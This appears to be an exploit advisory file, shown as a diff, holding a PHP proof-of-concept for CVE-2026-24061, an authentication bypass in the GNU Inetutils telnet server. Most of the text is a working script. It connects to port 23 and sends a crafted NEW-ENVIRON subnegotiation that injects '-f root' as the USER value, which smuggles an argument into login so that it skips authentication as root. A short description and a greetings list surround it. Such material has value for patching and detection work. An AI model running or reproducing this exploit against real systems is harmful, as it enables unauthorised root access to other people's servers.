@@ -1,0 +1,93 @@
+=============================================================================================================================================
+| # Title     : GNU Inetutils Telnet Authentication Bypass PHP Proof of Concept                                                             |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 147.0.3 (64 bits)                                                            |
+| # Vendor    : https://www.gnu.org/software/inetutils/                                                                                     |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/215519/  & 	CVE-2026-24061
+
+[+] Summary    : This PHP script is a PoC demonstrating a potential authentication bypass vulnerability in GNU Inetutils Telnet server identified as CVE-2026-24061.
+
+[+] The exploit works by:
+
+Establishing a TCP connection to the target Telnet service (default port 23).
+
+Crafting a malicious Telnet NEW-ENVIRON subnegotiation payload.
+
+Injecting a forged USER environment variable value.
+
+Attempting to manipulate the authentication process through improper handling of Telnet option negotiation.
+
+[+] The script:
+
+Connects to a specified host.
+
+Sends a specially crafted Telnet negotiation sequence.
+
+Attempts to bypass authentication by injecting -f root into the environment variable.
+
+Displays any response received from the target service.
+
+[+] POC :
+
+<?php
+
+set_time_limit(10);
+
+$host = $argv[1] ?? "127.0.0.1";
+$port = 23;
+$username = "root";
+
+echo "[*] Connecting to $host:$port...\n";
+
+$socket = fsockopen($host, $port, $errno, $errstr, 5);
+if (!$socket) {
+    die("[-] Connection failed: $errstr ($errno)\n");
+}
+
+stream_set_timeout($socket, 2);
+
+$IAC  = chr(255);
+$SB   = chr(250);
+$SE   = chr(240);
+$WILL = chr(251);
+$DO   = chr(253);
+
+$OPT_NEW_ENVIRON = chr(39);
+$NEW_ENVIRON_IS  = chr(0);
+$NEW_ENVIRON_VAR = chr(0);
+$NEW_ENVIRON_VALUE = chr(1);
+
+fread($socket, 1024);
+
+$payload  = $IAC . $SB . $OPT_NEW_ENVIRON;
+$payload .= $NEW_ENVIRON_IS;
+$payload .= $NEW_ENVIRON_VAR . "USER";
+$payload .= $NEW_ENVIRON_VALUE . "-f " . $username;
+$payload .= $IAC . $SE;
+
+echo "[*] Sending authentication bypass...\n";
+fwrite($socket, $payload);
+fflush($socket);
+
+$response = fread($socket, 4096);
+
+if ($response) {
+    echo "[+] Response received:\n";
+    echo $response . "\n";
+} else {
+    echo "[-] No response.\n";
+}
+
+fclose($socket);
+
+echo "[*] Done.\n";
+?>
+
+summary en titel
+	
+	
+Greetings to :======================================================================
+jericho * Larry W. Cashdollar * r00t * Hussin-X * Malvuln (John Page aka hyp3rlinx)|
+====================================================================================
